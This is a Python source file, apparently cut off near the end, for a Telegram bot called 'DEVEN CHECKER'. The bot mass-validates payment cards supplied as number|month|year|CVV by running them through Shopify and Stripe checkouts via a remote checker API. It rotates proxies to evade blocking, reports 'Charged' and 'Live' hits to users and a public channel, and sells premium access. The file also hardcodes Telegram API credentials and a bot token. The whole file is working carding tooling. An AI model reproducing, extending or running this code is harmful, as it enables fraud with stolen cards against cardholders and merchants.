from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import html
import uuid
from datetime import datetime
from emojis import e, EMOJI, emoji_id, plain_emoji, bv, row, bold, DIV, premiumize_emoji_html
from redeem import PLANS, generate_code, redeem_code, get_active_codes, get_code_info, revoke_code, is_redeem_code_text, get_expired_premium_users, remove_expired_user
import requests
from fake_useragent import UserAgent
from faker import Faker
from functions.stripe_gates import check_pp5, check_st1_1
CHECKER_API_URL = 'https://web-production-92c8c.up.railway.app/shopify'
def premium_emoji(text):
    """Forward to deven-shopi's premiumize_emoji_html (uses PREMIUM_EMOJI_IDS from functions/emojis.py)."""
    return premiumize_emoji_html(str(text) if text else "")
API_ID = 32784177  # Paste your API_ID here
API_HASH = '2cc2caf9dc383f5b679c86cc7a074a5a'
BOT_TOKEN = '8839546441:AAGuuHUJh44vIPHvYOFw0ZjQfE3Ts2A9wK8'
CHECKER_TIMEOUT = aiohttp.ClientTimeout(total=60, connect=8, sock_connect=8, sock_read=50)
_checker_session = None
async def _get_checker_session():
    global _checker_session
    if _checker_session is None or _checker_session.closed:
        _checker_session = aiohttp.ClientSession(
            timeout=CHECKER_TIMEOUT,
            connector=aiohttp.TCPConnector(limit=0, limit_per_host=0, force_close=True, enable_cleanup_closed=True),
        )
    return _checker_session
def _norm_proxy(proxy):
    """Normalize proxy to host:port:user:pass or host:port format for checker API"""
    if not proxy:
        return None
    proxy = str(proxy).strip()
    if not proxy:
        return None
    if '://' in proxy:
        m = re.match(r'^(?:https?|socks[45])://(?:([^:@]+):([^@]+)@)?([^:]+)(?::(\d+))?', proxy)
        if m:
            user, pwd, host, port = m.groups()
            if user and pwd:
                return f'{host}:{port}:{user}:{pwd}' if port else f'{host}:{user}:{pwd}'
            return f'{host}:{port}' if port else host
        return proxy
    if '@' in proxy:
        parts = proxy.split('@')
        if len(parts) == 2:
            creds = parts[0].split(':')
            host_port = parts[1].split(':')
            if len(creds) == 2 and len(host_port) >= 1:
                user, pwd = creds
                host = host_port[0]
                port = host_port[1] if len(host_port) > 1 else ''
                return f'{host}:{port}:{user}:{pwd}' if port else f'{host}:{user}:{pwd}'
    parts = proxy.split(':')
    if len(parts) >= 4 and parts[-3].isdigit():
        host = ':'.join(parts[:-3])
        port = parts[-3]
        user = parts[-2]
        pwd = parts[-1]
        return f'{host}:{port}:{user}:{pwd}'
    elif len(parts) >= 2 and parts[-1].isdigit():
        host = ':'.join(parts[:-1])
        port = parts[-1]
        return f'{host}:{port}'
    return proxy
PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
bot = TelegramClient('/tmp/checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)
def get_file_lines(filepath):
    """Helper to read lines from a file fresh every time"""
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as exc:
        print(f"Error reading {filepath}: {exc}")
        return []
def load_premium_users():
    return [l.strip().split('|')[0] for l in open(PREMIUM_FILE).read().splitlines() if l.strip()]
def load_sites():
    return get_file_lines(SITES_FILE)
def load_proxies():
    return get_file_lines(PROXY_FILE)
def is_premium(user_id):
    """Check if user is premium - Also checks expiry date when present"""
    uid = str(user_id)
    try:
        with open(PREMIUM_FILE) as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split('|')
                if parts[0] != uid:
                    continue
                if len(parts) > 1 and parts[1]:
                    try:
                        expiry = datetime.fromisoformat(parts[1])
                        if expiry < datetime.now():
                            continue
                    except:
                        pass
                return True
    except:
        pass
    return False
def extract_cc(text):
    """Extract CC from text in format: card|month|year|cvv"""
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards
def _fmt_price(price_raw):
    """Format price - round to 2 decimals, prefix $"""
    if isinstance(price_raw, (int, float)) and price_raw > 0:
        return f"${price_raw:.2f}"
    try:
        val = float(price_raw)
        if val > 0:
            return f"${val:.2f}"
    except:
        pass
    return '-' if price_raw in (0, 0.0, '-', '0', '0.0') else str(price_raw)
def is_dead_site_error(error_msg):
    """Check if error indicates dead site"""
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)
async def get_bin_info(card_number):
    """Get BIN info from API"""
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''
def is_site_dead(response_msg, gateway, price):
    """Check if the API response indicates a dead/unreachable site (deven-shopi logic)"""
    if not response_msg:
        return True
    if not gateway or gateway.lower() == "unknown":
        return True
    price_str = str(price)
    if price_str in ["-", "$-", "$0", "$0.0", "0", "$0.00"]:
        return True
    return False
async def check_card(card, site, proxy):
    """Check a single card against a site using the direct checker API"""
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
        if not site.startswith('http'):
            site = f'https://{site}'
        proxy_str = _norm_proxy(proxy)
        if not proxy_str:
            return {'status': 'Dead', 'message': 'No proxy provided', 'card': card, 'gateway': 'Unknown', 'price': '-'}
        url = f'{CHECKER_API_URL}?site={site}&cc={card}&proxy={proxy_str}'
        session = await _get_checker_session()
        for attempt in (1, 2):
            try:
                async with session.get(url) as resp:
                    raw = await resp.json(content_type=None)
                break
            except (json.JSONDecodeError, aiohttp.ContentTypeError):
                if attempt == 2:
                    try:
                        text = await resp.text()
                    except:
                        text = ''
                    snippet = text.strip()[:80]
                    if resp.status != 200:
                        return {'status': 'Site Error', 'message': f'HTTP {resp.status}: {snippet[:100]}', 'card': card, 'site': site, 'retry': True, 'gateway': 'Unknown', 'price': '-'}
                    if not snippet:
                        return {'status': 'Site Error', 'message': 'Empty 200 response (blocked)', 'card': card, 'site': site, 'retry': True, 'gateway': 'Unknown', 'price': '-'}
                    if snippet.startswith('<'):
                        return {'status': 'Site Error', 'message': f'Bot detected (HTML): {snippet[:60]}', 'card': card, 'site': site, 'retry': True, 'gateway': 'Unknown', 'price': '-'}
                    return {'status': 'Site Error', 'message': f'Invalid JSON: {snippet}', 'card': card, 'site': site, 'retry': True, 'gateway': 'Unknown', 'price': '-'}
                continue
        response_msg = raw.get('Response', '')
        price_raw = raw.get('Price', '-')
        gateway = raw.get('Gateway', 'Shopify')
        api_status = raw.get('Status', False)
        if isinstance(api_status, str):
            api_status = api_status.lower() in ('approved', 'charged', 'live', 'true')
        price = _fmt_price(price_raw)
        response_lower = response_msg.lower()
        if response_msg and 'Token error' in response_msg:
            return {'status': 'Site Error', 'message': f'Gateway token error: {response_msg[:60]}', 'card': card, 'site': site, 'retry': True, 'gateway': gateway, 'price': price}
        if not is_site_dead(response_msg, gateway, price_raw):
            retryable_keywords = ['delivery_company_required', 'payments_positive_amount_expected',
                                  'tax_new_tax_must_be_accepted', 'payments_credit_card_generic',
                                  'buyer_identity_presentment_currency_does_not_match',
                                  'unable to get payment token']
            if any(k in response_lower for k in retryable_keywords):
                return {'status': 'Site Error', 'message': response_msg, 'card': card, 'site': site, 'retry': True, 'gateway': gateway, 'price': price}
            if not api_status:
                return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
            if api_status or 'charged' in response_lower or 'order completed' in response_lower or '💎' in response_msg:
                return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
            elif 'thank you' in response_lower or 'payment successful' in response_lower:
                return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
            elif 'cloudflare bypass failed' in response_lower:
                return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gateway, 'price': price}
            elif any(key in response_lower for key in [
                'approved', 'success',
                'insufficient_funds', 'insufficient funds',
                'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
                'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
                'incorrect_zip', 'incorrect zip', 'cvv issue',
                '3d', '3d secure', 'otp', 'verification required',
                'authenticate', 'authentication required', 'challenge required',
                'redirecting to bank', 'bank verification', 'send code',
                'enter code', 'verify'
            ]):
                return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
            else:
                return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
        if 'captcha' in response_lower:
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'site': site, 'retry': False, 'gateway': gateway, 'price': price}
        if not response_msg or not gateway or gateway.lower() == 'unknown':
            return {'status': 'Site Error', 'message': response_msg or 'Site error', 'card': card, 'site': site, 'retry': True, 'gateway': gateway or 'Unknown', 'price': price}
        non_retryable_keywords = ['404', 'site error', 'error processing', 'not found', 'unavailable',
                                   'mismatch', 'not supported', 'not shopify', 'site not supported',
                                   'product not found']
        if any(k in response_lower for k in non_retryable_keywords):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'site': site, 'retry': False, 'gateway': gateway, 'price': price}
        return {'status': 'Site Error', 'message': response_msg, 'card': card, 'site': site, 'retry': True, 'gateway': gateway, 'price': price}
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'site': site, 'retry': True}
    except Exception as exc:
        error_msg = str(e)
        if is_dead_site_error(error_msg):
            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'site': site, 'retry': True}
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}
async def check_card_with_retry(card, sites, proxies, max_retries=5):
    """Check a card with automatic retry, removing bad proxies/sites"""
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
         return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    for attempt in range(max_retries):
        if not proxies:
            return {'status': 'Dead', 'message': 'All proxies exhausted', 'card': card, 'gateway': 'Unknown', 'price': '-'}
        if not sites:
            return {'status': 'Dead', 'message': 'All sites exhausted', 'card': card, 'gateway': 'Unknown', 'price': '-'}
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)
        msg = str(result.get('message', '')).lower()
        if any(b in msg for b in ('proxy error', 'httpsconnectionpool', 'server disconnected', 'blocked', 'bot detected')):
            if proxy in proxies:
                proxies.remove(proxy)
        if any(b in msg for b in ('site not supported', 'not shopify', '404', 'not found', 'product not found')):
            if site in sites:
                sites.remove(site)
            result['retry'] = True
        if not result.get('retry'):
            return result
        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)
    if last_result:
        msg = last_result.get('message', '')
        if 'proxy error' in str(msg).lower() or 'httpsconnectionpool' in str(msg).lower():
            return {'status': 'Dead', 'message': f'Proxy/bot errors after {max_retries} retries', 'card': card, 'gateway': 'Unknown', 'price': '-'}
        return {'status': 'Dead', 'message': f'Site errors: {msg}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}
async def check_card_concurrent(card, sites, proxies, max_concurrent=10, single_timeout=60):
    """Try multiple sites concurrently, return best result"""
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    async def try_site(site):
        proxy = random.choice(proxies) if proxies else None
        if not proxy:
            return None
        try:
            return await asyncio.wait_for(check_card(card, site, proxy), timeout=single_timeout)
        except:
            return None
    batch = random.sample(list(enumerate(sites)), min(max_concurrent, len(sites)))
    tasks = [asyncio.create_task(try_site(s)) for _, s in batch]
    done, _ = await asyncio.wait(tasks, return_when=asyncio.ALL_COMPLETED)
    results = []
    for t in done:
        try:
            r = t.result()
            if r:
                results.append(r)
        except:
            pass
    if not results:
        return {'status': 'Dead', 'message': 'All concurrent checks failed', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    for r in results:
        if r.get('status') == 'Charged':
            return r
    for r in results:
        if r.get('status') == 'Approved':
            return r
    for r in results:
        if not r.get('retry'):
            return r
    return results[0]
async def send_realtime_hit(user_id, result, hit_type, username):
    """Send real-time notification with new design + public channel hit"""
    status_emoji = EMOJI['charged'] if hit_type == "Charged" else EMOJI['live']
    status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if hit_type == "Charged" else "𝐋𝐢𝐯𝐞"
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    message = f"""「 {EMOJI['bolt']} <b>DEVEN CHECKER</b> {EMOJI['bolt']} 」
{status_emoji} <b>{status_text}</b>
{EMOJI['card']} <b>CC</b> <code>{result['card']}</code>
🌐 <b>Gateway</b> {result.get('gateway', 'Unknown')}
📋 <b>Response</b> {result['message'][:150]}
💵 <b>Price</b> {result.get('price', '-')}
{EMOJI['search']} <b>BIN</b> {brand} - {bin_type} - {level}
🏦 <b>Bank</b> {bank}
🌐 <b>Country</b> {country} {flag}
{DIV}
Made by <a href="https://t.me/zyokt">𝐃𝐞𝐯𝐞𝐧</a>"""
    try:
        await bot.send_message(user_id, message, parse_mode='html')
    except:
        pass
    try:
        status_public = "🔥" if hit_type == "Charged" else "🔥"
        gateway = result.get('gateway', 'Unknown')
        response = result.get('message', '')[:80]
        now = datetime.now().strftime("%H:%M:%S")
        public_text = (
            f"<b>🔥 Hit Detected! 🔥</b>\n\n"
            f"▸ 📍 Status · <b>{hit_type}</b>\n"
            f"▸ 🛒 Gateway · <b>{gateway}</b>\n"
            f"▸ 📝 Response · <code>{response}</code>\n"
            f"▸ 👤 User · @{username}\n"
            f"▸ ⏱️ · {now}"
        )
        await bot.send_message(HIT_CHAT_ID, premium_emoji(public_text), parse_mode='html')
    except:
        pass
async def update_progress(user_id, message_id, results, current_attempt_count):
    """Update progress message with new design"""
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    if hours:
        elapsed_label = f"{hours}h {minutes}m {seconds}s"
    elif minutes:
        elapsed_label = f"{minutes}m {seconds}s"
    else:
        elapsed_label = f"{seconds}s"
    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else '#Mass_Shopify')
    progress_text = f"""「 {EMOJI['bolt']} <b>DEVEN CHECKER</b> {EMOJI['bolt']} 」
🌐 <b>Gateway</b> {gateway}
{EMOJI['card']} <b>Total</b> {results['total']}
{EMOJI['stats']} <b>Checked</b> {current_attempt_count}/{results['total']}
⏱️ <b>Duration</b> {elapsed_label}
{EMOJI['charged']} <b>Charged</b> {len(results['charged'])}
{EMOJI['live']} <b>Live</b> {len(results['approved'])}
{EMOJI['declined']} <b>Dead</b> {len(results['dead'])}
{DIV}"""
    btn_icon_progress = emoji_id("num_2")
    buttons = [
        [Button.inline(f" {bold('Pause')} ", b"pause", icon=btn_icon_progress, style="primary"), Button.inline(f" {bold('Resume')} ", b"resume", icon=btn_icon_progress, style="primary")],
        [Button.inline(f" {bold('Stop')} ", b"stop", icon=btn_icon_progress, style="danger")]
    ]
    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except:
        pass
async def send_final_results(user_id, results):
    """Send final results with txt file and new design"""
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    if hours:
        elapsed_label = f"{hours}h {minutes}m {seconds}s"
    elif minutes:
        elapsed_label = f"{minutes}m {seconds}s"
    else:
        elapsed_label = f"{seconds}s"
    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f"✅ <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f"🔥 <code>{r['card']}</code>\n"
    if not hits_text:
        hits_text = "No hits found"
    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else '#Mass_Shopify')
    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    summary = f"""「 {EMOJI['bolt']} <b>DEVEN CHECKER</b> {EMOJI['bolt']} 」
🌐 <b>Gateway</b> {gateway}
{EMOJI['card']} <b>Total</b> {results['total']}
{EMOJI['stats']} <b>Checked</b> {results['checked']}/{results['total']}
⏱️ <b>Duration</b> {elapsed_label}
{EMOJI['charged']} <b>Charged</b> {len(results['charged'])}
{EMOJI['live']} <b>Live</b> {len(results['approved'])}
{EMOJI['declined']} <b>Dead</b> {len(results['dead'])}
🎯 <b>Hits</b>
{hits_text}
{DIV}
Made by <a href="https://t.me/zyokt">𝐃𝐞𝐯𝐞𝐧</a>"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"deven_{user_id}_{timestamp}.txt"
    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n")
        await f.write("⚡️ DEVEN CHECKER RESULTS ⚡️\n")
        await f.write("=" * 70 + "\n\n")
        await f.write(f"✅ CHARGED ({len(results['charged'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {_fmt_price(r.get('price', '-'))} | {r['message'][:100]}\n")
        await f.write("\n")
        await f.write(f"🔥 APPROVED ({len(results['approved'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {_fmt_price(r.get('price', '-'))} | {r['message'][:100]}\n")
        await f.write("\n")
        await f.write(f"❌ DEAD ({len(results['dead'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {_fmt_price(r.get('price', '-'))} | {r['message'][:100]}\n")
    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')
    try:
        os.remove(filename)
    except:
        pass
import requests
async def test_site(site, proxy):
    """Test a single site using a real proxy test + checker API"""
    try:
        proxy_str = _norm_proxy(proxy)
        if not proxy_str:
            return {'site': site, 'status': 'dead'}
        alive, _ = await asyncio.get_event_loop().run_in_executor(None, _test_proxy_sync, proxy)
        if not alive:
            return {'site': site, 'status': 'dead'}
        test_card = "5154623245618097|03|2032|156"
        url = f'{CHECKER_API_URL}?site={site}&cc={test_card}&proxy={proxy_str}'
        session = await _get_checker_session()
        async with session.get(url) as resp:
            raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if is_dead_site_error(response_msg) or 'proxy dead' in response_msg:
            return {'site': site, 'status': 'dead'}
        return {'site': site, 'status': 'alive'}
    except:
        return {'site': site, 'status': 'dead'}
def _test_proxy_sync(proxy):
    """Test proxy by making an actual HTTP request through it (deven-shopi style)."""
    try:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            ip, port, user, password = proxy_parts
            proxy_url = f'http://{user}:{password}@{ip}:{port}'
        elif len(proxy_parts) == 2:
            ip, port = proxy_parts
            proxy_url = f'http://{ip}:{port}'
        else:
            return False, None
        p = {'http': proxy_url, 'https': proxy_url}
        start = time.time()
        r = requests.get('https://www.shopify.com', proxies=p, timeout=15)
        ms = (time.time() - start) * 1000
        if r.status_code == 200:
            return True, round(ms, 1)
    except:
        pass
    return False, None
async def test_proxy(proxy):
    """Test proxy by trying to reach Shopify through it (deven-shopi style)."""
    try:
        alive, ms = await asyncio.get_event_loop().run_in_executor(None, _test_proxy_sync, proxy)
        if alive:
            return {'proxy': proxy, 'status': 'alive', 'ms': ms}
        return {'proxy': proxy, 'status': 'dead'}
    except:
        return {'proxy': proxy, 'status': 'dead'}
@bot.on(events.NewMessage(pattern=r'/start\s+((?:DEVEN|SHOPI)-[A-Z0-9][A-Z0-9-]{5,})'))
async def start_with_code(event):
    code = event.pattern_match.group(1)
    uid = event.sender_id
    result = redeem_code(code, uid)
    if result['success']:
        expiry_str = result.get('expiry', 'N/A')
        text = f"""{EMOJI['crown']} <b>Redeem Successful!</b>
{EMOJI['bolt']} Plan: <b>{result['plan'].upper()}</b>
{EMOJI['clock']} Days: <b>{result['days']}</b>
{EMOJI['card']} Workers: <b>{result['workers']}</b>
{EMOJI['folder']} Mass Limit: <b>{result['mass_limit']}</b>
{EMOJI['calendar']} Expires: <b>{expiry_str}</b>"""
        await event.reply(text, parse_mode='html', buttons=[[Button.url(f"{EMOJI['bolt']} Go to Bot", f'https://t.me/Devenpro_Bot?start={code}')]])
    else:
        await event.reply(f"{EMOJI['cross']} <b>Redeem Failed</b>\n\n{EMOJI['warning']} {result['error']}", parse_mode='html')
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    first_name = (await event.get_sender()).first_name or "User"
    uid = event.sender_id
    btn_icon = emoji_id("num_2")
    buttons = [
        [Button.inline(" 𝗖𝗠𝗗 ", b"show_cmds", icon=btn_icon, style="primary"),
         Button.inline(" 𝗦𝗜𝗧𝗘𝗦 ", b"show_sites", icon=btn_icon, style="primary")],
        [Button.inline(" 𝗣𝗥𝗢𝗫𝗬 ", b"show_proxy", icon=btn_icon, style="primary")],
    ]
    if uid in ADMIN_ID:
        buttons.append([Button.inline(" 𝗔𝗗𝗠𝗜𝗡 ", b"admin_panel", icon=btn_icon, style="primary")])
    text = f"""{EMOJI['welcome']} <b>DEVEN CHECKER</b>
hey , <b>{bold(first_name)}</b> {EMOJI['bolt']}
  ┣ {EMOJI['card']} <b>Single</b> → <code>/sh</code>, <code>/st1</code>, <code>/str1</code>
  ┣ {EMOJI['folder']} <b>Mass</b> → <code>/msh</code>, <code>/mst1</code>, <code>/mstr1</code>
  ┣ {EMOJI['wrench']} <b>Proxy</b> → <code>/proxy</code>
  ┗ {EMOJI['globe']} <b>Sites</b> → <code>/site</code> / <code>/fuck</code>
{DIV}
Made by <a href="https://t.me/zyokt">𝐃𝐞𝐯𝐞𝐧</a>"""
    try:
        await bot.send_file(event.chat_id, 'deven.jpg', caption=text, buttons=buttons, parse_mode='html')
    except:
        await event.reply(text, buttons=buttons, parse_mode='html')
@bot.on(events.NewMessage(pattern=r'^/sh\s+'))
async def single_cc_check(event):
    """Check a single CC"""
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
        first_name = sender.first_name if sender.first_name else "User"
    except:
        username = f"user_{user_id}"
        first_name = "User"
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this bot."), parse_mode='html')
        return
    sites = load_sites()
    proxies = load_proxies()
    if not sites:
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
        return
    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/sh card|mm|yy|cvv</code>"), parse_mode='html')
        return
    card = cards[0]
    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    status_msg = await event.reply(
        premium_emoji(
            f"⚡️ 𝐃𝐄𝐕𝐄𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ⚡️\n\n"
            f"💳 CC : <code>{card}</code>\n"
            f"Checking…"
        ),
        parse_mode='html'
    )
    try:
        result = await check_card_concurrent(card, sites, proxies, max_concurrent=10, single_timeout=60)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        if result['status'] == 'Charged':
            status_key = "charged"
            status_emoji = EMOJI['charged']
            status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
        elif result['status'] == 'Approved':
            status_key = "live"
            status_emoji = EMOJI['live']
            status_text = "𝐋𝐢𝐯𝐞"
        else:
            status_key = "declined"
            status_emoji = EMOJI['declined']
            status_text = "𝐃𝐄𝐀𝐃 𝐂𝐀𝐑𝐃"
        final_resp = f"""「 {EMOJI['bolt']} <b>DEVEN CHECKER</b> {EMOJI['bolt']} 」
{status_emoji} <b>{status_text}</b>
{EMOJI['card']} <b>CC</b> <code>{result['card']}</code>
🌐 <b>Gateway</b> {result.get('gateway', 'Unknown')}
📋 <b>Response</b> {result['message'][:150]}
💵 <b>Price</b> {result.get('price', '-')}
{EMOJI['search']} <b>BIN</b> {brand} - {bin_type} - {level}
🏦 <b>Bank</b> {bank}
🌐 <b>Country</b> {country} {flag}
{DIV}
Made by <a href="https://t.me/zyokt">𝐃𝐞𝐯𝐞𝐧</a>"""
        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
    except Exception as exc:
        await status_msg.edit(premium_emoji(f"❌ Error checking card: {exc}"), parse_mode='html')
@bot.on(events.NewMessage(pattern=r'^/mshproxy\s+'))
async def check_single_proxy(event):
    """Check a single proxy"""
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return
    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(premium_emoji("❌ Usage: <code>/mshproxy ip:port:user:pass</code>"), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')
    try:
        result = await test_proxy(proxy)
        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
    except Exception as exc:
        await status_msg.edit(premium_emoji(f"❌ Error checking proxy: {exc}"), parse_mode='html')
@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy(event):
    """Remove a single proxy from proxy.txt"""
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return
    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
        return
    current_proxies = load_proxies()
    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return
    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")
    await event.reply(premium_emoji(f"✅ <b>Proxy Removed!</b>\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')
@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    """Remove proxies by index (comma separated)"""
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return
    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return
    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
        return
    current_proxies = load_proxies()
    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return
    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)
    if not removed:
        await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')
        return
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")
